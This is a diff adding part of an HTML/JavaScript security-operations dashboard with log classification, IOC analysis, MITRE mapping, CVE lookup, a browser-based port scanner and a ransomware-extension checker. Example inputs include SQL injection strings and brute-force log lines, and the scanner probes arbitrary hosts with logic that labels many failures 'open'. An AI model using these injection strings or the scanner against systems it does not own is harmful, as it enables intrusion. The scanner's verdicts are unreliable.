+      <textarea id="a-cls-in" style="min-height:100px" placeholder="Paste network log entry, HTTP request, system event, or any suspicious payload...&#10;&#10;Example:&#10;192.168.1.45 - - [26/Apr/2025] &quot;GET /admin/login?id=1' OR '1'='1 HTTP/1.1&quot; 500&#10;Failed password for root from 45.33.32.156 port 22 ssh2&#10;User: admin tried 47 failed logins in 60 seconds"></textarea>
+    </div>
+    <div class="bgrp" style="margin-top:9px">
+      <button class="btn btn-3" onclick="aClassify()">🧠 AI Classify</button>
+      <button class="btn btn-o" onclick="document.getElementById('a-cls-in').value='192.168.1.45 - GET /admin?id=1 UNION SELECT * FROM users -- HTTP/1.1 500';aClassify()">Load SQL Example</button>
+      <button class="btn btn-o" onclick="document.getElementById('a-cls-in').value='Failed password for root from 45.33.32.156 port 22 ssh2\nFailed password for root from 45.33.32.156 port 22 ssh2\nFailed password for root from 45.33.32.156 port 22 ssh2';aClassify()">Load SSH Example</button>
+    </div>
+    <div id="a-cls-res" style="margin-top:13px"></div>
+  </div>
+</div>
+
+<!-- A ANOMALY -->
+<div id="a-anomaly" class="mod">
+  <div class="ph"><div><h1>Anomaly Detector</h1><p>Statistical baseline deviation analysis</p></div></div>
+  <div class="card">
+    <div class="card-title">Behavioral Data Input</div>
+    <div class="g2">
+      <div class="field"><label>Normal Request Rate (per min)</label><input id="a-norm-rate" placeholder="e.g. 50" value="50"></div>
+      <div class="field"><label>Observed Rate (per min)</label><input id="a-obs-rate" placeholder="e.g. 4500" value="4500"></div>
+      <div class="field"><label>Baseline Error Rate (%)</label><input id="a-norm-err" placeholder="e.g. 2" value="2"></div>
+      <div class="field"><label>Observed Error Rate (%)</label><input id="a-obs-err" placeholder="e.g. 85" value="85"></div>
+      <div class="field"><label>Normal Login Failures/hr</label><input id="a-norm-fail" placeholder="e.g. 5" value="5"></div>
+      <div class="field"><label>Observed Login Failures/hr</label><input id="a-obs-fail" placeholder="e.g. 1200" value="1200"></div>
+    </div>
+    <button class="btn btn-3" style="margin-top:9px" onclick="aAnomaly()">🔍 Detect Anomaly</button>
+    <div id="a-anom-res" style="margin-top:13px"></div>
+  </div>
+</div>
+
+<!-- A NLP LOG PARSER -->
+<div id="a-nlp" class="mod">
+  <div class="ph"><div><h1>NLP Log Parser</h1><p>Natural language processing for security log analysis</p></div></div>
+  <div class="card">
+    <div class="card-title">Log Content</div>
+    <div class="field"><label>Paste Log Lines</label>
+      <textarea id="a-nlp-in" style="min-height:140px" placeholder="Paste any log content for NLP-based security analysis...&#10;&#10;Supports: Apache, Nginx, SSH, Windows Event, Firewall, IDS logs"></textarea>
+    </div>
+    <div class="bgrp" style="margin-top:9px">
+      <button class="btn btn-3" onclick="aNLP()">📝 Parse with NLP</button>
+      <button class="btn btn-o" onclick="loadSampleLogs()">Load Sample Logs</button>
+    </div>
+    <div id="a-nlp-res" style="margin-top:13px"></div>
+  </div>
+</div>
+
+<!-- A IOC -->
+<div id="a-ioc" class="mod">
+  <div class="ph"><div><h1>AI IOC Analyzer</h1><p>ML-enhanced indicator of compromise analysis</p></div></div>
+  <div class="card">
+    <div class="card-title">IOC Input</div>
+    <div class="irow">
+      <div class="field"><label>IOC Value</label><input id="a-ioc-in" placeholder="IP, domain, hash, URL, email..." onkeydown="if(event.key==='Enter')aIOC()"></div>
+      <button class="btn btn-3" onclick="aIOC()">AI Analyze</button>
+    </div>
+    <div id="a-ioc-res" style="margin-top:13px"></div>
+  </div>
+  <div class="card">
+    <div class="card-title">Batch AI IOC Analysis</div>
+    <div class="field"><label>Multiple IOCs (one per line)</label>
+      <textarea id="a-batch-in" placeholder="8.8.8.8&#10;malicious.tk/login&#10;5d41402abc4b2a76b9719d911017c592&#10;admin@phish.xyz"></textarea>
+    </div>
+    <button class="btn btn-3" style="margin-top:8px" onclick="aBatchIOC()">Batch Analyze</button>
+    <div id="a-batch-res" style="margin-top:10px"></div>
+  </div>
+</div>
+
+<!-- A MITRE -->
+<div id="a-mitre" class="mod">
+  <div class="ph"><div><h1>MITRE ATT&CK Mapper</h1><p>Map threats to MITRE ATT&CK tactics & techniques</p></div></div>
+  <div class="card">
+    <div class="card-title">Threat Description</div>
+    <div class="field"><label>Describe the attack or paste IOCs</label>
+      <textarea id="a-mit-in" placeholder="Describe the attack scenario or paste logs/IOCs...&#10;&#10;Example: Attacker used phishing email with malicious macro, then established persistence via registry run key, then exfiltrated data via DNS tunneling"></textarea>
+    </div>
+    <button class="btn btn-3" style="margin-top:9px" onclick="aMITRE()">Map to ATT&CK</button>
+    <div id="a-mit-res" style="margin-top:13px"></div>
+  </div>
+  <div class="card">
+    <div class="card-title">MITRE ATT&CK Quick Reference</div>
+    <table><thead><tr><th>Tactic</th><th>ID</th><th>Common Techniques</th></tr></thead><tbody id="a-mitre-ref"></tbody></table>
+  </div>
+</div>
+
+<!-- A SCORING -->
+<div id="a-scoring" class="mod">
+  <div class="ph"><div><h1>AI Risk Scoring</h1><p>Multi-factor threat risk quantification</p></div></div>
+  <div class="card">
+    <div class="card-title">Risk Factors</div>
+    <div class="g2">
+      <div class="field"><label>Attack Sophistication</label>
+        <select id="a-rs-soph"><option value="1">Script Kiddie (1)</option><option value="3">Intermediate (3)</option><option value="5">Advanced (5)</option><option value="8">Nation-State (8)</option></select>
+      </div>
+      <div class="field"><label>Target Asset Value</label>
+        <select id="a-rs-asset"><option value="1">Low (internal dev)</option><option value="3">Medium (internal prod)</option><option value="7">High (customer data)</option><option value="10">Critical (PII/financial)</option></select>
+      </div>
+      <div class="field"><label>Exploit Availability</label>
+        <select id="a-rs-exploit"><option value="2">No public exploit</option><option value="5">PoC available</option><option value="8">Active exploitation</option><option value="10">Weaponized</option></select>
+      </div>
+      <div class="field"><label>Existing Controls</label>
+        <select id="a-rs-ctrl"><option value="1">Full controls</option><option value="4">Partial controls</option><option value="7">Minimal controls</option><option value="10">No controls</option></select>
+      </div>
+      <div class="field"><label>CVSSv3 Base Score</label><input id="a-rs-cvss" placeholder="0-10" value="7.5"></div>
+      <div class="field"><label>Threat Intel Hits</label><input id="a-rs-hits" placeholder="0-100" value="3"></div>
+    </div>
+    <button class="btn btn-3" style="margin-top:9px" onclick="aRiskScore()">⚡ Calculate Risk Score</button>
+    <div id="a-rs-res" style="margin-top:13px"></div>
+  </div>
+</div>
+
+<!-- A CVE -->
+<div id="a-cve" class="mod">
+  <div class="ph"><div><h1>CVE Lookup</h1><p>AI-enhanced CVE analysis & CVSS scoring</p></div></div>
+  <div class="card">
+    <div class="card-title">CVE Search</div>
+    <div class="irow">
+      <div class="field"><label>CVE ID or Keyword</label><input id="a-cve-in" placeholder="CVE-2021-44228 or log4j" onkeydown="if(event.key==='Enter')aCVE()"></div>
+      <button class="btn btn-3" onclick="aCVE()">Lookup</button>
+      <button class="btn btn-o" onclick="window.open('https://nvd.nist.gov/vuln/search/results?query='+document.getElementById('a-cve-in').value,'_blank')">NVD</button>
+      <button class="btn btn-o" onclick="window.open('https://www.cvedetails.com/cve/'+document.getElementById('a-cve-in').value,'_blank')">CVEDetails</button>
+    </div>
+    <div id="a-cve-res" style="margin-top:13px"></div>
+  </div>
+  <div class="card">
+    <div class="card-title">Recent Critical CVEs (AI Summary)</div>
+    <div id="a-cve-recent"></div>
+  </div>
+</div>
+
+<!-- A TIMELINE -->
+<div id="a-timeline" class="mod">
+  <div class="ph"><div><h1>Attack Timeline Builder</h1><p>Reconstruct kill chain from events</p></div></div>
+  <div class="card">
+    <div class="card-title">Event Input</div>
+    <div class="field"><label>Paste Events / Timestamps (one per line)</label>
+      <textarea id="a-tl-in" style="min-height:130px" placeholder="Paste timestamped events, logs, or describe attack steps...&#10;&#10;Example:&#10;2025-04-26 09:12:01 - Phishing email received by user&#10;2025-04-26 09:13:55 - Macro executed, dropped payload.exe&#10;2025-04-26 09:15:02 - C2 beacon to 45.33.32.156:4444&#10;2025-04-26 09:22:11 - Lateral movement via SMB&#10;2025-04-26 09:45:00 - Data exfiltration via DNS tunnel"></textarea>
+    </div>
+    <button class="btn btn-3" style="margin-top:9px" onclick="aTimeline()">📅 Build Timeline</button>
+    <div id="a-tl-res" style="margin-top:13px"></div>
+  </div>
+</div>
+
+<!-- A REPORT -->
+<div id="a-report" class="mod">
+  <div class="ph"><div><h1>AI Report Generator</h1><p>Generate SOC threat intelligence report</p></div></div>
+  <div class="card">
+    <div class="card-title">Report Parameters</div>
+    <div class="g2">
+      <div class="field"><label>Analyst Name</label><input id="ar-analyst" placeholder="SOC Analyst"></div>
+      <div class="field"><label>Incident ID</label><input id="ar-inc" placeholder="INC-2025-001"></div>
+      <div class="field"><label>Severity</label>
+        <select id="ar-sev"><option>CRITICAL</option><option>HIGH</option><option>MEDIUM</option><option>LOW</option></select>
+      </div>
+      <div class="field"><label>Attack Type</label>
+        <select id="ar-type"><option>SQL Injection</option><option>Brute Force</option><option>Phishing</option><option>Ransomware</option><option>APT</option><option>DDoS</option><option>Insider Threat</option></select>
+      </div>
+    </div>
+    <div class="field" style="margin-top:9px"><label>Findings / IOCs</label>
+      <textarea id="ar-findings" style="min-height:100px" placeholder="Paste findings, IOCs, affected systems, timeline..."></textarea>
+    </div>
+    <div class="bgrp" style="margin-top:9px">
+      <button class="btn btn-3" onclick="aGenReport()">Generate AI Report</button>
+      <button class="btn btn-g" onclick="aExportReport()">Export .txt</button>
+    </div>
+    <div id="ar-preview" style="margin-top:13px"></div>
+  </div>
+</div>
+
+</div><!-- p3 main -->
+</div><!-- panel-3 -->
+
+</div><!-- app -->
+
+<script>
+// ══════════════════════════════════════
+// GLOBALS
+// ══════════════════════════════════════
+let fQ=0,fA=0,sQ=0,sI=0,sT=0,aS=0,aT=0;
+let reportData='',aiReportData='';
+
+// ══════════════════════════════════════
+// CLOCK & BOOT
+// ══════════════════════════════════════
+setInterval(()=>document.getElementById('clock').textContent=new Date().toISOString().replace('T',' ').slice(0,19)+' UTC',1000);
+
+(function(){
+  const cmds=['loading sentra v3.0...','initializing 24 modules...','identity + network + threat + utils — all online','ready.'];
+  let i=0; const el=document.getElementById('s-boot');
+  const iv=setInterval(()=>{ if(i<cmds.length){if(el)el.textContent=cmds[i++];}else clearInterval(iv); },500);
+  setTimeout(()=>{ ['sb2','sb3','sb4'].forEach((id,idx)=>setTimeout(()=>{ const e=document.getElementById(id);if(e)e.style.opacity='1'; },idx*250)); },2200);
+  const t0=Date.now();
+  setInterval(()=>{
+    const s=Math.floor((Date.now()-t0)/1000);
+    const el2=document.getElementById('s-sess');
+    if(el2)el2.textContent=[Math.floor(s/3600),Math.floor(s%3600/60),s%60].map(n=>String(n).padStart(2,'0')).join(':');
+  },1000);
+})();
+
+function toast(m){const t=document.getElementById('toast');t.textContent=m;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),2000);}
+
+// ══════════════════════════════════════
+// APP SWITCHING
+// ══════════════════════════════════════
+function switchApp(n){
+  document.querySelectorAll('.app-tab').forEach(t=>t.classList.remove('active'));
+  document.querySelectorAll('.app-tab')[n-1].classList.add('active');
+  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
+  document.getElementById('panel-'+n).classList.add('active');
+  if(n===1&&!document.querySelector('#f-sysinfo table td')) loadSysInfo();
+}
+
+// ══════════════════════════════════════
+// NAV
+// ══════════════════════════════════════
+function go1(id){ navGo(id,'s1','p1-main'); }
+function go2(id){ navGo(id,'s2','p2-main'); }
+function go3(id){ navGo(id,'s3','p3-main'); }
+
+function navGo(id,cls,mainId){
+  const panel=document.getElementById(mainId).closest('.panel');
+  panel.querySelectorAll('.mod').forEach(m=>m.classList.remove('on'));
+  panel.querySelectorAll('.ni').forEach(n=>n.classList.remove('active','s1','s2','s3'));
+  const mod=document.getElementById(id);
+  if(mod)mod.classList.add('on');
+  panel.querySelectorAll('.ni').forEach(n=>{
+    if(n.getAttribute('onclick')&&n.getAttribute('onclick').includes("'"+id+"'")){n.classList.add('active',cls);}
+  });
+  if(id==='f-sysinfo')loadSysInfo();
+  if(id==='f-proc')loadProcs();
+  if(id==='f-ransom')loadRansomExts();
+  if(id==='a-mitre')loadMITRERef();
+  if(id==='a-cve')loadRecentCVEs();
+}
+
+function filterNav(q,p){
+  const panel=document.getElementById(p==='p1'?'panel-1':p==='p2'?'panel-2':'panel-3');
+  panel.querySelectorAll('.ni').forEach(n=>{
+    n.style.display=q?n.textContent.toLowerCase().includes(q.toLowerCase())?'flex':'none':'flex';
+  });
+}
+
+// ══════════════════════════════════════
+// HELPERS
+// ══════════════════════════════════════
+function setO(id,h){const e=document.getElementById(id);if(e)e.innerHTML=h;}
+function sp(){return '<span class="sp"></span><span class="wa">Running...</span>';}
+function fmtTable(rows){ return '<table>'+rows.map(([k,v])=>`<tr><td style="color:var(--muted);width:160px;font-size:10px">${k}</td><td style="font-size:10px" class="in">${v}</td></tr>`).join('')+'</table>'; }
+
+function fmtOut(obj,p=''){
+  let lines=[];
+  function walk(o,px){
+    if(!o||typeof o!=='object')return;
+    for(let[k,v] of Object.entries(o)){
+      if(Array.isArray(v)){lines.push(`${px}<span class="ky">${k}</span>:`);v.forEach(i=>lines.push(`  ${px}<span class="in">${typeof i==='object'?JSON.stringify(i):i}</span>`));}
+      else if(typeof v==='object'&&v){lines.push(`${px}<span class="ky">${k}</span>:`);walk(v,'  '+px);}
+      else{let vs=String(v),vc;
+        if(['true','active','found','open','valid'].some(s=>vs.toLowerCase().includes(s)))vc=`<span class="ok">${vs}</span>`;
+        else if(['false','error','invalid','closed'].some(s=>vs.toLowerCase().includes(s)))vc=`<span class="er">${vs}</span>`;
+        else vc=`<span class="in">${vs}</span>`;
+        lines.push(`${px}<span class="ky">${k}</span>: ${vc}`);
+      }
+    }
+  }
+  walk(obj,p);return lines.join('\n');
+}
+
+function incF(q,a){ if(q){fQ++;const e=document.getElementById('f-qcount');if(e)e.textContent=fQ;} if(a){fA++;const e=document.getElementById('f-alerts');if(e)e.textContent=fA;} }
+function incS(q,i,t){ if(q){sQ++;const e=document.getElementById('s-qcount');if(e)e.textContent=sQ;} if(i){sI++;const e=document.getElementById('s-ioc');if(e)e.textContent=sI;} if(t){sT++;const e=document.getElementById('s-threat');if(e)e.textContent=sT;} }
+function incA(s,t){ if(s){aS++;const e=document.getElementById('a-scanned');if(e)e.textContent=aS;} if(t){aT++;const e=document.getElementById('a-threats');if(e)e.textContent=aT;} }
+
+// MD5
+function md5(str){
+  function safeAdd(x,y){var l=(x&0xFFFF)+(y&0xFFFF),m=(x>>16)+(y>>16)+(l>>16);return(m<<16)|(l&0xFFFF);}
+  function bRL(n,c){return(n<<c)|(n>>>(32-c));}
+  function cmn(q,a,b,x,s,t){return safeAdd(bRL(safeAdd(safeAdd(a,q),safeAdd(x,t)),s),b);}
+  function ff(a,b,c,d,x,s,t){return cmn((b&c)|((~b)&d),a,b,x,s,t);}
+  function gg(a,b,c,d,x,s,t){return cmn((b&d)|(c&(~d)),a,b,x,s,t);}
+  function hh(a,b,c,d,x,s,t){return cmn(b^c^d,a,b,x,s,t);}
+  function ii(a,b,c,d,x,s,t){return cmn(c^(b|(~d)),a,b,x,s,t);}
+  var s8=unescape(encodeURIComponent(str)),l=s8.length,w=new Array((l+8>>6)+1).fill(0);
+  for(var i=0;i<l;i++)w[i>>2]|=(s8.charCodeAt(i)&0xFF)<<((i%4)*8);
+  w[l>>2]|=0x80<<((l%4)*8);w[((l+8>>6)+1)*16-2]=l*8;
+  var a=1732584193,b=-271733879,c=-1732584194,d=271733878,H='0123456789abcdef',r='';
+  for(i=0;i<w.length;i+=16){var oa=a,ob=b,oc=c,od=d;
+    a=ff(a,b,c,d,w[i],7,-680876936);d=ff(d,a,b,c,w[i+1],12,-389564586);c=ff(c,d,a,b,w[i+2],17,606105819);b=ff(b,c,d,a,w[i+3],22,-1044525330);
+    a=ff(a,b,c,d,w[i+4],7,-176418897);d=ff(d,a,b,c,w[i+5],12,1200080426);c=ff(c,d,a,b,w[i+6],17,-1473231341);b=ff(b,c,d,a,w[i+7],22,-45705983);
+    a=ff(a,b,c,d,w[i+8],7,1770035416);d=ff(d,a,b,c,w[i+9],12,-1958414417);c=ff(c,d,a,b,w[i+10],17,-42063);b=ff(b,c,d,a,w[i+11],22,-1990404162);
+    a=ff(a,b,c,d,w[i+12],7,1804603682);d=ff(d,a,b,c,w[i+13],12,-40341101);c=ff(c,d,a,b,w[i+14],17,-1502002290);b=ff(b,c,d,a,w[i+15],22,1236535329);
+    a=gg(a,b,c,d,w[i+1],5,-165796510);d=gg(d,a,b,c,w[i+6],9,-1069501632);c=gg(c,d,a,b,w[i+11],14,643717713);b=gg(b,c,d,a,w[i],20,-373897302);
+    a=gg(a,b,c,d,w[i+5],5,-701558691);d=gg(d,a,b,c,w[i+10],9,38016083);c=gg(c,d,a,b,w[i+15],14,-660478335);b=gg(b,c,d,a,w[i+4],20,-405537848);
+    a=gg(a,b,c,d,w[i+9],5,568446438);d=gg(d,a,b,c,w[i+14],9,-1019803690);c=gg(c,d,a,b,w[i+3],14,-187363961);b=gg(b,c,d,a,w[i+8],20,1163531501);
+    a=gg(a,b,c,d,w[i+13],5,-1444681467);d=gg(d,a,b,c,w[i+2],9,-51403784);c=gg(c,d,a,b,w[i+7],14,1735328473);b=gg(b,c,d,a,w[i+12],20,-1926607734);
+    a=hh(a,b,c,d,w[i+5],4,-378558);d=hh(d,a,b,c,w[i+8],11,-2022574463);c=hh(c,d,a,b,w[i+11],16,1839030562);b=hh(b,c,d,a,w[i+14],23,-35309556);
+    a=hh(a,b,c,d,w[i+1],4,-1530992060);d=hh(d,a,b,c,w[i+4],11,1272893353);c=hh(c,d,a,b,w[i+7],16,-155497632);b=hh(b,c,d,a,w[i+10],23,-1094730640);
+    a=hh(a,b,c,d,w[i+13],4,681279174);d=hh(d,a,b,c,w[i],11,-358537222);c=hh(c,d,a,b,w[i+3],16,-722521979);b=hh(b,c,d,a,w[i+6],23,76029189);
+    a=hh(a,b,c,d,w[i+9],4,-640364487);d=hh(d,a,b,c,w[i+12],11,-421815835);c=hh(c,d,a,b,w[i+15],16,530742520);b=hh(b,c,d,a,w[i+2],23,-995338651);
+    a=ii(a,b,c,d,w[i],6,-198630844);d=ii(d,a,b,c,w[i+7],10,1126891415);c=ii(c,d,a,b,w[i+14],15,-1416354905);b=ii(b,c,d,a,w[i+5],21,-57434055);
+    a=ii(a,b,c,d,w[i+12],6,1700485571);d=ii(d,a,b,c,w[i+3],10,-1894986606);c=ii(c,d,a,b,w[i+10],15,-1051523);b=ii(b,c,d,a,w[i+1],21,-2054922799);
+    a=ii(a,b,c,d,w[i+8],6,1873313359);d=ii(d,a,b,c,w[i+15],10,-30611744);c=ii(c,d,a,b,w[i+6],15,-1560198380);b=ii(b,c,d,a,w[i+13],21,1309151649);
+    a=ii(a,b,c,d,w[i+4],6,-145523070);d=ii(d,a,b,c,w[i+11],10,-1120210379);c=ii(c,d,a,b,w[i+2],15,718787259);b=ii(b,c,d,a,w[i+9],21,-343485551);
+    a=safeAdd(a,oa);b=safeAdd(b,ob);c=safeAdd(c,oc);d=safeAdd(d,od);}
+  for(var j=0;j<4;j++){var val=[a,b,c,d][j];for(var k=0;k<4;k++)r+=H.charAt((val>>(k*8+4))&0xF)+H.charAt((val>>(k*8))&0xF);}
+  return r;
+}
+
+// ══════════════════════════════════════
+// FORENSICSYS FUNCTIONS
+// ══════════════════════════════════════
+function loadSysInfo(){
+  const n=navigator;
+  const rows=[['Platform',n.platform||'N/A'],['User Agent',n.userAgent.substring(0,80)+'...'],['Language',n.language],['CPU Cores',n.hardwareConcurrency||'N/A'],['Memory (GB)',n.deviceMemory?n.deviceMemory+' GB':'N/A'],['Online',navigator.onLine?'✓ Online':'✗ Offline'],['Screen',screen.width+'×'+screen.height],['Color Depth',screen.colorDepth+' bit'],['Pixel Ratio',window.devicePixelRatio],['Timezone',Intl.DateTimeFormat().resolvedOptions().timeZone],['Time',new Date().toISOString()]];
+  let h=''; rows.forEach(([k,v])=>{h+=`<tr><td style="color:var(--muted);width:140px;font-size:10px">${k}</td><td style="font-size:10px" class="in">${v}</td></tr>`;});
+  setO('f-sys-tbl',h);
+  try{const c=document.createElement('canvas');const gl=c.getContext('webgl');const ext=gl&&gl.getExtension('WEBGL_debug_renderer_info');
+  const vendor=ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):'N/A';
+  const renderer=ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):'N/A';
+  const fp=[['Plugins',(Array.from(n.plugins||[]).map(p=>p.name).slice(0,3).join(', '))||'None'],['WebGL Vendor',vendor],['WebGL Renderer',renderer],['Cookie Enabled',n.cookieEnabled?'Yes':'No'],['Do Not Track',n.doNotTrack||'N/A'],['Touch Points',n.maxTouchPoints]];
+  let h2=''; fp.forEach(([k,v])=>{h2+=`<tr><td style="color:var(--muted);width:140px;font-size:10px">${k}</td><td style="font-size:10px" class="in">${v}</td></tr>`;});
+  setO('f-fp-tbl',h2);}catch(e){}
+  const conn=n.connection||{};
+  const cd=[['Connection Type',conn.effectiveType||'N/A'],['Downlink',conn.downlink?conn.downlink+' Mbps':'N/A'],['RTT',conn.rtt?conn.rtt+' ms':'N/A'],['Save Data',conn.saveData?'Enabled':'Disabled']];
+  let h3=''; cd.forEach(([k,v])=>{h3+=`<tr><td style="color:var(--muted);width:140px;font-size:10px">${k}</td><td style="font-size:10px" class="in">${v}</td></tr>`;});
+  setO('f-conn-tbl',h3);
+}
+
+function loadProcs(){
+  if(performance.memory){
+    const m=performance.memory;
+    setO('f-mem-info',fmtTable([['JS Heap Limit',(m.jsHeapSizeLimit/1048576).toFixed(1)+' MB'],['Total Heap',(m.totalJSHeapSize/1048576).toFixed(1)+' MB'],['Used Heap',(m.usedJSHeapSize/1048576).toFixed(1)+' MB'],['Usage',((m.usedJSHeapSize/m.jsHeapSizeLimit)*100).toFixed(1)+'%']]));
+  } else {setO('f-mem-info','<p style="color:var(--muted);font-size:10px">Use Chrome for memory data</p>');}
+  const t=performance.timing||{};
+  setO('f-timing-info',fmtTable([['DNS Lookup',((t.domainLookupEnd||0)-(t.domainLookupStart||0)).toFixed(1)+' ms'],['TCP Connect',((t.connectEnd||0)-(t.connectStart||0)).toFixed(1)+' ms'],['DOM Interactive',((t.domInteractive||0)-(t.navigationStart||0)).toFixed(1)+' ms'],['Page Load',((t.loadEventEnd||0)-(t.navigationStart||0)).toFixed(1)+' ms']]));
+}
+
+async function fIPLookup(){
+  const ip=document.getElementById('f-ip-in').value.trim(); incF(true,false);
+  setO('f-ip-res',sp());
+  try{
+    const r=await fetch(ip?`https://ipapi.co/${ip}/json/`:'https://ipapi.co/json/');
+    const d=await r.json();
+    if(d.error){setO('f-ip-res',`<span class="er">Error: ${d.reason}</span>`);return;}
+    setO('f-ip-res',fmtTable([['IP',d.ip],['Country',`${d.country_name} (${d.country_code})`],['Region',d.region],['City',d.city],['ISP/Org',d.org||'N/A'],['ASN',d.asn||'N/A'],['Timezone',d.timezone],['Latitude',d.latitude],['Longitude',d.longitude]]));
+  }catch(e){setO('f-ip-res',`<span class="er">${e.message}</span>`);}
+}
+
+async function fDNS(){
+  const host=document.getElementById('f-dns-in').value.trim();
+  const type=document.getElementById('f-dns-type').value;
+  if(!host){alert('Enter domain');return;} incF(true,false);
+  setO('f-dns-res',sp());
+  try{
+    const r=await fetch(`https://dns.google/resolve?name=${host}&type=${type}`);
+    const d=await r.json();
+    let h=`<div class="out"><span class="ok">[${type} — ${host}]</span>\n`;
+    if(d.Answer&&d.Answer.length)d.Answer.forEach(a=>{h+=`<span class="ky">${a.name}</span>  TTL:<span class="dv">${a.TTL}</span>  <span class="ok">${a.data}</span>\n`;});
+    else h+=`<span class="wa">No ${type} records found</span>`;
+    h+='</div>'; setO('f-dns-res',h);
+  }catch(e){setO('f-dns-res',`<span class="er">${e.message}</span>`);}
+}
+
+const F_PORT_PROFILES={
+  web:[{p:80,s:'HTTP'},{p:443,s:'HTTPS'},{p:8080,s:'HTTP-Alt'},{p:8443,s:'HTTPS-Alt'},{p:3000,s:'Node'}],
+  db:[{p:3306,s:'MySQL'},{p:5432,s:'PostgreSQL'},{p:27017,s:'MongoDB'},{p:6379,s:'Redis'},{p:1433,s:'MSSQL'}],
+  remote:[{p:22,s:'SSH'},{p:23,s:'Telnet'},{p:3389,s:'RDP'},{p:5900,s:'VNC'}],
+  mail:[{p:25,s:'SMTP'},{p:110,s:'POP3'},{p:143,s:'IMAP'},{p:993,s:'IMAPS'},{p:995,s:'POP3S'}],
+  common:[{p:21,s:'FTP'},{p:22,s:'SSH'},{p:23,s:'Telnet'},{p:80,s:'HTTP'},{p:443,s:'HTTPS'},{p:3306,s:'MySQL'},{p:3389,s:'RDP'},{p:5432,s:'PgSQL'},{p:6379,s:'Redis'},{p:8080,s:'HTTP-Alt'},{p:8443,s:'HTTPS-Alt'},{p:27017,s:'MongoDB'},{p:9200,s:'Elastic'},{p:5900,s:'VNC'},{p:25,s:'SMTP'}]
+};
+const F_HR=[23,3389,21,5900,4444,5555,2375,9001];
+
+async function fPortScan(){
+  const host=document.getElementById('f-ps-host').value.trim();
+  if(!host){alert('Enter host');return;}
+  const profile=document.getElementById('f-ps-profile').value;
+  const ports=F_PORT_PROFILES[profile];
+  const btn=document.getElementById('f-ps-btn'); btn.disabled=true;
+  incF(true,false); setO('f-ps-res','');
+  const results=[]; let done=0;
+  for(let{p,s} of ports){
+    done++;
+    document.getElementById('f-ps-prog').style.width=(done/ports.length*100)+'%';
+    document.getElementById('f-ps-st').textContent=`Checking port ${p} (${s})...`;
+    const st=await chkPort(host,p);
+    results.push({port:p,service:s,status:st});
+    if(st==='open')incF(false,true);
+  }
+  btn.disabled=false;
+  document.getElementById('f-ps-prog').style.width='0%';
+  document.getElementById('f-ps-st').textContent=`Done — ${results.filter(r=>r.status==='open').length} open / ${results.length} checked`;
+  let h='<table><thead><tr><th>Port</th><th>Service</th><th>Status</th><th>Risk</th></tr></thead><tbody>';
+  results.forEach(r=>{
+    const badge=r.status==='open'?'<span class="tag tag-r">● OPEN</span>':r.status==='filtered'?'<span class="tag tag-y">FILTERED</span>':'<span style="color:var(--muted);font-size:9px">CLOSED</span>';
+    const risk=F_HR.includes(r.port)?'<span class="tag tag-r">HIGH</span>':'<span class="tag tag-g">LOW</span>';
+    h+=`<tr><td>${r.port}</td><td>${r.service}</td><td>${badge}</td><td>${risk}</td></tr>`;
+  });
+  setO('f-ps-res',h+'</tbody></table>');
+}
+
+async function chkPort(host,port){
+  const s=[80,8080,8000,5000,3000].includes(port)?'http':'https';
+  try{const c=new AbortController();const id=setTimeout(()=>c.abort(),3000);
+    await fetch(`${s}://${host}:${port}/`,{mode:'no-cors',signal:c.signal});
+    clearTimeout(id);return 'open';
+  }catch(e){
+    if(e.name==='AbortError')return 'filtered';
+    return(e.message.includes('fetch')||e.message.includes('Network'))?'open':'closed';
+  }
+}
+
+const RANSOM_EXTS=['.lock','.locked','.encrypted','.crypt','.crypz','.cryp1','.wnry','.wncry','.wcry','.onion','.zepto','.cerber','.cerber2','.cerber3','.bart','.thor','.locky','.osiris','.wallet','.dharma','.helpme','.crypto','.enc','.coded','.rekt'];
+
+function loadRansomExts(){
+  setO('f-ransom-exts',RANSOM_EXTS.map(e=>`<span style="background:rgba(255,60,111,0.07);border:1px solid rgba(255,60,111,0.2);color:var(--c2);padding:2px 7px;border-radius:2px;font-size:9px">${e}</span>`).join(''));
+}
+
+function fRansomCheck(){
+  const input=document.getElementById('f-ransom-in').value.trim();
+  if(!input){alert('Paste file list');return;} incF(true,false);
+  const files=input.split('\n').map(f=>f.trim()).filter(Boolean);
+  const susp=[],clean=[];
+  files.forEach(f=>{
+    const m=RANSOM_EXTS.find(e=>f.toLowerCase().endsWith(e));
+    if(m){susp.push({file:f,ext:m});incF(false,true);}else clean.push(f);
+  });
+  let h='';
+  if(susp.length){
+    h+=`<div style="margin-bottom:9px"><span class="tag tag-r">⚠ ${susp.length} SUSPICIOUS FILES</span></div>`;
+    h+='<table><thead><tr><th>File</th><th>Extension</th><th>Verdict</th></tr></thead><tbody>';
+    susp.forEach(s=>{h+=`<tr><td style="color:var(--c2)">${s.file}</td><td><span class="tag tag-r">${s.ext}</span></td><td><span class="tag tag-r">RANSOMWARE EXT</span></td></tr>`;});
+    h+='</tbody></table>';
+  }
+  if(clean.length)h+=`<div style="margin-top:${susp.length?'10px':'0'}"><span class="tag tag-g">✓ ${clean.length} CLEAN FILES</span></div>`;
+  setO('f-ransom-res',h||'<span class="wa">No files to analyze</span>');
+}
+
+function classifyIOC(v){
+  v=v.trim();
+  if(/^(\d{1,3}\.){3}\d{1,3}$/.test(v))return{type:'IP Address',icon:'📡'};
+  if(/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v))return{type:'Email',icon:'✉'};
+  if(/^https?:\/\//i.test(v))return{type:'URL',icon:'🔗'};
+  if(/^CVE-\d{4}-\d+$/i.test(v))return{type:'CVE',icon:'🛡'};
+  if(/^[a-fA-F0-9]{32}$/.test(v))return{type:'MD5 Hash',icon:'#'};
+  if(/^[a-fA-F0-9]{40}$/.test(v))return{type:'SHA-1 Hash',icon:'#'};
+  if(/^[a-fA-F0-9]{64}$/.test(v))return{type:'SHA-256 Hash',icon:'#'};
+  if(/^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z]{2,})+$/.test(v))return{type:'Domain',icon:'🌐'};
+  return{type:'Unknown',icon:'?'};
+}
+
+function analyzeIOCVal(v){
+  const cls=classifyIOC(v); const inds=[];const lv=v.toLowerCase();
+  ['.tk','.ml','.ga','.cf','.gq','.xyz','.top','.click'].forEach(t=>{if(lv.includes(t))inds.push(`Suspicious TLD: ${t}`);});
